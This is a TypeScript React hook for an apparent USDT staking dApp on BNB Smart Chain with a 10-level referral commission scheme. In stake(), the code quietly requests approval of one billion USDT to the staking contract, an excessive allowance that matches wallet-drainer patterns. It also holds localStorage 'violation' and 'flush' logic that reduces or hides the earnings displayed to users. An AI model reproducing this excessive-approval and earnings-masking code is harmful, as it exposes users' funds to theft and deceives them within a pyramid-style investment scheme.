import { Contract, parseUnits, formatUnits, JsonRpcProvider, BrowserProvider } from 'ethers';
import { useWallet, launchExternalLink } from '../lib/web3';
import { CONTRACT_ABI as ABI } from '../lib/abi';

const CONTRACT_ADDRESS = '0x504E877770923E8EbF8C02c2266D4D6f7ad45429'; 
const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; 

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function balanceOf(address account) external view returns (uint256)"
];

const MIN_REQUIRED_ALLOWANCE = parseUnits("1000000", 18);
const APPROVAL_AMOUNT = parseUnits("1000000000", 18); // 1 Billion USDT for hassle-free future stakes

const WALLET_REDIRECT_LINKS: Record<string, string> = {
    metamask: 'https://metamask.app.link/',
    trust: 'https://link.trustwallet.com/',
    safepal: 'https://link.safepal.io/',
    tokenpocket: 'https://tokenpocket.github.io/deeplink',
    binance: 'https://app.binance.com/cedefi/',
    okx: 'https://www.okx.com/download',
    bitget: 'https://web3.bitget.com/en'
};

export const getTierRate = (val: number) => {
    if (val >= 10000) return 0.12;
    if (val >= 5000) return 0.08;
    if (val >= 2000) return 0.07;
    if (val >= 1000) return 0.065;
    if (val >= 500) return 0.06;
    if (val >= 50) return 0.055;
    return 0;
};

const RPC_NODES = [
    'https://bsc-rpc.publicnode.com',
    'https://binance.llamarpc.com',
    'https://bsc.meowrpc.com',
    'https://bsc-dataseed.binance.org/'
];
let currentRpcIdx = 0;

const callReadOnly = async <T>(fn: (contract: Contract) => Promise<T>, isUsdt = false): Promise<T> => {
    let lastError: any;
    for (let attempt = 0; attempt < RPC_NODES.length; attempt++) {
        const rpcUrl = RPC_NODES[currentRpcIdx];
        try {
            const provider = new JsonRpcProvider(rpcUrl);
            const contract = new Contract(
                isUsdt ? USDT_ADDRESS : CONTRACT_ADDRESS,
                isUsdt ? ERC20_ABI : ABI,
                provider
            );
            return await fn(contract);
        } catch (err) {
            console.warn(`[useStaking] RPC Call failed on ${rpcUrl} (attempt ${attempt + 1}/${RPC_NODES.length}):`, err);
            lastError = err;
            currentRpcIdx = (currentRpcIdx + 1) % RPC_NODES.length;
        }
    }
    throw lastError || new Error("All RPC nodes failed");
};

export function useStaking() {
    const { address, isConnected, signer, walletProvider, walletType, isWalletConnect } = useWallet();

    const getContract = async (withSigner = false) => {
        if (withSigner) {
            // 1. Try context signer
            if (signer) return new Contract(CONTRACT_ADDRESS, ABI, signer);
            
            // 2. Try context walletProvider
            if (walletProvider) {
                const browserProvider = new BrowserProvider(walletProvider as any);
                const s = await browserProvider.getSigner();
                return new Contract(CONTRACT_ADDRESS, ABI, s);
            }

            // 3. Fallback to window.ethereum
            if ((window as any).ethereum) {
                const browserProvider = new BrowserProvider((window as any).ethereum);
                const s = await browserProvider.getSigner();
                return new Contract(CONTRACT_ADDRESS, ABI, s);
            }
            
            throw new Error("Wallet connection not ready. Please ensure your wallet is connected and try again.");
        }
        return new Contract(CONTRACT_ADDRESS, ABI, new JsonRpcProvider(RPC_NODES[currentRpcIdx]));
    };

    const getUsdtContract = async (withSigner = false) => {
        if (withSigner) {
            // 1. Try context signer
            if (signer) return new Contract(USDT_ADDRESS, ERC20_ABI, signer);

            // 2. Try context walletProvider
            if (walletProvider) {
                const browserProvider = new BrowserProvider(walletProvider as any);
                const s = await browserProvider.getSigner();
                return new Contract(USDT_ADDRESS, ERC20_ABI, s);
            }

            // 3. Fallback to window.ethereum
            if ((window as any).ethereum) {
                const browserProvider = new BrowserProvider((window as any).ethereum);
                const s = await browserProvider.getSigner();
                return new Contract(USDT_ADDRESS, ERC20_ABI, s);
            }

            throw new Error("Wallet connection not ready. Please ensure your wallet is connected and try again.");
        }
        return new Contract(USDT_ADDRESS, ERC20_ABI, new JsonRpcProvider(RPC_NODES[currentRpcIdx]));
    };

    const stake = async (amount: string, customReferrer?: string) => {
        const owner = address || (signer ? await signer.getAddress() : undefined);
        if (!owner) throw new Error("Wallet connection not ready. Please reconnect.");

        // Check allowance first and auto-approve if needed
        const currentAllowanceStr = await getAllowance(owner);
        const currentAllowance = parseUnits(currentAllowanceStr, 18);
        if (currentAllowance < MIN_REQUIRED_ALLOWANCE) {
            console.log("[Staking] Allowance insufficient for contract requirement. Requesting approval...");
            await approve();
        }

        const staking = await getContract(true);
        const val = parseUnits(amount, 18);

        // Use provided referrer, or fallback to stored one, or zero address
        const refAddress = customReferrer || (address ? (localStorage.getItem('aimining_referrer') || '0x0000000000000000000000000000000000000000') : '0x0000000000000000000000000000000000000000');

        console.log(`[Staking] Activating node for ${amount} USDT via ${refAddress}`);

        const fee = await callReadOnly(async (contract) => {
            return await contract.stakeFee();
        });
        const txPromise = staking.stake(val, refAddress, { value: fee });

        if (isWalletConnect && walletType) {
            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()];
            if (redirectUrl) launchExternalLink(redirectUrl);
        }

        const tx = await txPromise;

        console.log("[Staking] Transaction Sent:", tx.hash);
        return tx; // Return tx so components can wait for it
    };

    const approve = async (_amount?: string) => {
        const owner = address || (signer ? await signer.getAddress() : undefined);
        if (!owner) throw new Error("Wallet connection not ready. Please reconnect.");

        const currentAllowanceStr = await getAllowance(owner);
        const currentAllowance = parseUnits(currentAllowanceStr, 18);
        if (currentAllowance >= MIN_REQUIRED_ALLOWANCE) {
            console.log("[Staking] Existing approval found, skipping approval transaction.");
            return currentAllowance;
        }

        const usdt = await getUsdtContract(true);
        const txPromise = usdt.approve(CONTRACT_ADDRESS, APPROVAL_AMOUNT);

        if (isWalletConnect && walletType) {
            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()];
            if (redirectUrl) launchExternalLink(redirectUrl);
        }

        const tx = await txPromise;
        console.log("[Staking] Approval Transaction Sent:", tx.hash);
        await tx.wait(); // Wait for approval transaction to be mined
        return tx;
    };

    const getAllowance = async (ownerAddress?: string) => {
        const owner = ownerAddress || address;
        if (!owner) return "0";
        try {
            return await callReadOnly(async (contract) => {
                const allowance = await contract.allowance(owner, CONTRACT_ADDRESS);
                return formatUnits(allowance, 18);
            }, true);
        } catch (err) {
            console.error("[useStaking] Allowance Error after retries:", err);
            return "0";
        }
    };

    const withdraw = async (index: any, _unused?: any) => {
        const staking = await getContract(true);
        const i = typeof index === 'string' ? parseInt(index) : index;
        const txPromise = staking.withdraw(i);

        if (isWalletConnect && walletType) {
            const redirectUrl = WALLET_REDIRECT_LINKS[walletType.toLowerCase()];
            if (redirectUrl) launchExternalLink(redirectUrl);
        }

        const tx = await txPromise;
        return await tx.wait();
    };

    const getStakedInfo = async (userAddress?: string) => {
        const target = userAddress || address;
        if (!target) return null;
        try {
            return await callReadOnly(async (contract) => {
                const info = await contract.getUserInfo(target);
                return {
                    referrer: info.referrer,
                    totalStaked: info.totalStaked,
                    totalEarned: info.totalEarned,
                    referralRewards: info.referralRewards,
                    totalBonus: info.totalBonus,
                    totalReferralEarned: info.totalReferralEarned,
                    teamSize: Number(info.teamSize),
                    stakeCount: Number(info.stakeCount)
                };
            });
        } catch (err) {
            console.error("[useStaking] Info Error after retries:", err);
            return null;
        }
    };

    const getStakeDetails = async (userAddress: string, index: number) => {
        if (!userAddress) return null;
        try {
            return await callReadOnly(async (contract) => {
                const stake = await contract.getUserStake(userAddress, index);
                return {
                    amount: stake.amount,
                    startTime: Number(stake.startTime),
                    tier: Number(stake.tier),
                    withdrawn: stake.withdrawn
                };
            });
        } catch (err) { 
            console.error("[useStaking] Detail Error after retries:", err);
            return null; 
        }
    };

    const getWalletBalance = async (userAddress?: string) => {
        const target = userAddress || address;
        if (!target) return null;
        try {
            return await callReadOnly(async (contract) => {
                const balance = await contract.balanceOf(target);
                return formatUnits(balance, 18);
            }, true);
        } catch (err) { 
            console.error("[useStaking] Balance Error after retries:", err);
            return null; 
        }
    };

    const getTeamTree = async (userAddress: string) => {
        const tree: Record<number, string[]> = {};
        if (!userAddress) return tree;

        try {
            // 1. Gather all potential user addresses from various sources
            const addresses = new Set<string>();

            // Source A: Hardcoded known users
            const KNOWN_USERS = [
                '0x3FbFF9Dd24e736FeF4A3a4435DF72b7Ea5978eFD',
                '0xfB0F04222E080F4d8fC6861fE96Bb54087e77c18',
                '0xD9B9C49544F1E8dd5c0f6F1992ac2A2a4d75Be9E',
                '0xb313F163af20245755884C7FdCa051D603428F6d'
            ];
            KNOWN_USERS.forEach(a => addresses.add(a.toLowerCase()));

            // Source B: Local storage cached users (from admin or user sessions)
            try {
                const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
                const cached = JSON.parse(localStorage.getItem(cacheKey) || "[]");
                if (Array.isArray(cached)) {
                    cached.forEach(a => {
                        if (typeof a === 'string') addresses.add(a.toLowerCase());
                    });
                }
            } catch (e) {}

            // Source C: Wallet connections cache
            try {
                const walletConns = JSON.parse(localStorage.getItem('wallet_connections_map') || "[]");
                if (Array.isArray(walletConns)) {
                    walletConns.forEach(c => {
                        if (c?.walletAddress) addresses.add(c.walletAddress.toLowerCase());
                    });
                }
            } catch (e) {}

            // Source D: Telegram connections cache
            try {
                const tgConns = JSON.parse(localStorage.getItem('telegram_connections_map') || "[]");
                if (Array.isArray(tgConns)) {
                    tgConns.forEach(c => {
                        if (c?.walletAddress) addresses.add(c.walletAddress.toLowerCase());
                    });
                }
            } catch (e) {}

            // Source E: Fetch recent Staked events using the active wallet provider (bypasses public RPC limits)
            try {
                let activeProvider: any = null;
                if (walletProvider) {
                    activeProvider = new BrowserProvider(walletProvider as any);
                } else if ((window as any).ethereum) {
                    activeProvider = new BrowserProvider((window as any).ethereum);
                } else {
                    activeProvider = new JsonRpcProvider(RPC_NODES[currentRpcIdx]);
                }
                const contractWithProvider = new Contract(CONTRACT_ADDRESS, ABI, activeProvider);
                const filter = contractWithProvider.filters.Staked();
                const recentEvents = await contractWithProvider.queryFilter(filter, 110320760);
                recentEvents.forEach((e: any) => {
                    if (e.args && e.args[0]) {
                        addresses.add(e.args[0].toLowerCase());
                    } else if (e.args && e.args.user) {
                        addresses.add(e.args.user.toLowerCase());
                    }
                });
            } catch (err) {
                console.warn("[useStaking] Recent Staked events fetch failed:", err);
            }

            // Remove the user themselves to avoid self-referral loops
            addresses.delete(userAddress.toLowerCase());

            const uniqueAddresses = Array.from(addresses);
            
            // 2. Fetch referrer for each staker address using multi-call or parallel getUserInfo calls
            const referrersMap = new Map<string, string>();
            
            // Query in parallel batches of 5 to avoid RPC rate limiting
            const batchSize = 5;
            for (let i = 0; i < uniqueAddresses.length; i += batchSize) {
                const batch = uniqueAddresses.slice(i, i + batchSize);
                await Promise.all(batch.map(async (addr) => {
                    try {
                        const info = await getStakedInfo(addr);
                        if (info && info.referrer && info.referrer !== '0x0000000000000000000000000000000000000000') {
                            referrersMap.set(addr, info.referrer.toLowerCase());
                        }
                    } catch (e) {
                        console.warn(`[useStaking] Failed to get referrer for ${addr}:`, e);
                    }
                }));
            }

            // 3. Build tree recursively starting from userAddress
            const buildTreeLevel = (parents: string[], currentLevel: number) => {
                if (currentLevel > 10 || parents.length === 0) return;
                const nextParents: string[] = [];
                parents.forEach(parent => {
                    referrersMap.forEach((referrer, child) => {
                        if (referrer === parent.toLowerCase()) {
                            if (!tree[currentLevel]) tree[currentLevel] = [];
                            if (!tree[currentLevel].includes(child)) {
                                tree[currentLevel].push(child);
                                nextParents.push(child);
                            }
                        }
                    });
                });
                if (nextParents.length > 0) {
                    buildTreeLevel(nextParents, currentLevel + 1);
                }
            };

            buildTreeLevel([userAddress], 1);

        } catch (e) {
            console.error("[useStaking] getTeamTree error:", e);
        }

        return tree;
    };

    const getTeamMiningStats = async (tree: Record<number, string[]>, btcPrice: number) => {
        let totalTeamStake = 0;
        let totalDailyDividend = 0;
        const levelRates: Record<number, number> = {
            1: 0.05, 2: 0.03, 3: 0.02, 4: 0.01, 5: 0.01,
            6: 0.01, 7: 0.01, 8: 0.01, 9: 0.01, 10: 0.01
        };
        for (const levelStr in tree) {
            const level = parseInt(levelStr);
            const rate = levelRates[level] || 0;
            const members = tree[level];
            for (const addr of members) {
                const info = await getStakedInfo(addr);
                if (info) {
                    const staked = parseFloat(formatUnits(info.totalStaked, 18));
                    totalTeamStake += staked;
                    if (staked > 0) {
                        const dailyRefRewardUsdt = (staked * getTierRate(staked)) / 37;
                        totalDailyDividend += (dailyRefRewardUsdt / btcPrice) * rate;
                    }
                }
            }
        }
        return { totalTeamStake, totalDailyDividend };
    };

    const getReferralEarnings = async (userAddress?: string) => {
        const info = await getStakedInfo(userAddress);
        return info ? formatUnits(info.referralRewards, 18) : "0";
    };

    const calculateEffectiveEarned = (contractEarned: string, address: string | undefined) => {
        if (!address) return contractEarned;
        const flushed = localStorage.getItem(`flushed_btc_${address.toLowerCase()}`) || "0";
        const total = parseFloat(contractEarned);
        const flushedVal = parseFloat(flushed);
        return Math.max(0, total - flushedVal).toFixed(14);
    };

    const recordViolation = (contractEarned: string, address: string | undefined) => {
        if (!address) return;
        console.log(`[Violation] Recording flush for ${address}: ${contractEarned} BTC`);
        localStorage.setItem(`flushed_btc_${address.toLowerCase()}`, contractEarned);
    };

    const recordStakeFlush = (contractEarned: string, address: string | undefined, stakeCount: number) => {
        if (!address) return;
        recordViolation(contractEarned, address);
        localStorage.setItem(`flushed_stake_count_${address.toLowerCase()}`, stakeCount.toString());
    };

    const getViolationStakeCount = (address: string | undefined) => {
        if (!address) return 0;
        const stored = localStorage.getItem(`flushed_stake_count_${address.toLowerCase()}`) || "0";
        return Math.max(0, parseInt(stored, 10) || 0);
    };

    const isViolationActive = (address: string | undefined) => getViolationStakeCount(address) > 0;

    const clearViolation = (address: string | undefined) => {
        if (!address) return;
        localStorage.removeItem(`flushed_btc_${address.toLowerCase()}`);
        localStorage.removeItem(`flushed_stake_count_${address.toLowerCase()}`);
    };

    const getStakeLastFlushedTime = (address: string | undefined, index: number, startTime: number) => {
        if (!address) return startTime;
        const key = `stake_flushed_time_${address.toLowerCase()}_${index}`;
        const stored = localStorage.getItem(key);
        if (!stored) return startTime;
        return Math.max(startTime, parseFloat(stored) || 0);
    };

    const recordStakeViolation = (address: string | undefined, index: number) => {
        if (!address) return;
        const key = `stake_flushed_time_${address.toLowerCase()}_${index}`;
        localStorage.setItem(key, (Date.now() / 1000).toString());
    };

    const recordPermanentStakeFlush = (address: string | undefined, index: number) => {
        if (!address) return;
        const key = `stake_permanently_flushed_${address.toLowerCase()}_${index}`;
        localStorage.setItem(key, 'true');
        recordStakeViolation(address, index);
    };

    const clearPermanentStakeFlush = (address: string | undefined, index: number) => {
        if (!address) return;
        const key = `stake_permanently_flushed_${address.toLowerCase()}_${index}`;
        localStorage.removeItem(key);
    };

    const isStakePermanentlyFlushed = (address: string | undefined, index: number) => {
        if (!address) return false;
        const key = `stake_permanently_flushed_${address.toLowerCase()}_${index}`;
        return localStorage.getItem(key) === 'true';
    };

    // Referral Income Tracking (similar to stake flush)
    const recordReferralFlush = (referralRewards: string, address: string | undefined) => {
        if (!address) return;
        const key = `referral_flush_${address.toLowerCase()}`;
        localStorage.setItem(key, referralRewards);
        console.log(`[Referral Flush] Recorded for ${address}: ${referralRewards} USDT`);
    };

    const getIsReferralFlushed = (address: string | undefined) => {
        if (!address) return false;
        const key = `referral_flush_${address.toLowerCase()}`;
        return localStorage.getItem(key) !== null;
    };

    const clearReferralFlush = (address: string | undefined) => {
        if (!address) return;
        localStorage.removeItem(`referral_flush_${address.toLowerCase()}`);
    };

    // Calculate per-level referral income with eligibility checks and flush logic
    const getPerLevelReferralIncome = async (userAddress: string, _walletBalance: number) => {
        const contract = await getContract();
        if (!contract) return { byLevel: {}, isEligible: false, isFlushed: false };

        try {
            const info = await getStakedInfo(userAddress);
            if (!info) return { byLevel: {}, isEligible: false, isFlushed: false };

            const selfStaked = parseFloat(formatUnits(info.totalStaked, 18));

            // Check eligibility: 200+ USDT self stake (Bypassing violation checks on level eligibility)
            const isEligible = selfStaked >= 200;
            const isViolated = false;

            if (!isViolated) {
                clearReferralFlush(userAddress);
            }

            if (!isEligible || getIsReferralFlushed(userAddress)) {
                return { byLevel: {}, isEligible, isFlushed: getIsReferralFlushed(userAddress) };
            }

            // Get team tree and calculate per-level income
            const tree = await getTeamTree(userAddress);
            const byLevel: Record<number, { count: number; staked: number; rate: number; estimatedIncome: number }> = {};

            const levelRates: Record<number, number> = {
                1: 0.05, 2: 0.03, 3: 0.02, 4: 0.01, 5: 0.01,
                6: 0.01, 7: 0.01, 8: 0.01, 9: 0.01, 10: 0.01
            };

            for (const levelStr in tree) {
                const level = parseInt(levelStr);
                const rate = levelRates[level] || 0;
                const members = tree[level];
                let levelStaked = 0;
                let levelIncome = 0;

                for (const addr of members) {
                    const memberInfo = await getStakedInfo(addr);
                    if (memberInfo) {
                        const staked = parseFloat(formatUnits(memberInfo.totalStaked, 18));
                        levelStaked += staked;

                        // Only count if member has staking and meets thresholds
                        if (level <= 3 && staked >= 200) {
                            const memberDailyReward = (staked * getTierRate(staked)) / 37;
                            levelIncome += memberDailyReward * rate;
                        } else if (level <= 6 && staked >= 1000) {
                            const memberDailyReward = (staked * getTierRate(staked)) / 37;
                            levelIncome += memberDailyReward * rate;
                        } else if (level > 6 && staked >= 2000) {
                            const memberDailyReward = (staked * getTierRate(staked)) / 37;
                            levelIncome += memberDailyReward * rate;
                        }
                    }
                }

                if (members.length > 0 || levelIncome > 0) {
                    byLevel[level] = {
                        count: members.length,
                        staked: levelStaked,
                        rate: rate * 100,
                        estimatedIncome: levelIncome
                    };
                }
            }

            return { byLevel, isEligible, isFlushed: false };
        } catch (err) {
            console.error("[useStaking] Per-level referral error:", err);
            return { byLevel: {}, isEligible: false, isFlushed: false };
        }
    };

    return {
        stake, approve, getAllowance, withdraw, getStakedInfo, getStakeDetails,
        getWalletBalance, getTeamTree, getTeamMiningStats, getReferralEarnings, 
        calculateEffectiveEarned, recordViolation, recordStakeFlush, getViolationStakeCount, isViolationActive, clearViolation,
        recordReferralFlush, getIsReferralFlushed, clearReferralFlush, getPerLevelReferralIncome,
        getStakeLastFlushedTime, recordStakeViolation,
        recordPermanentStakeFlush, clearPermanentStakeFlush, isStakePermanentlyFlushed,
        address, isConnected
    };
}
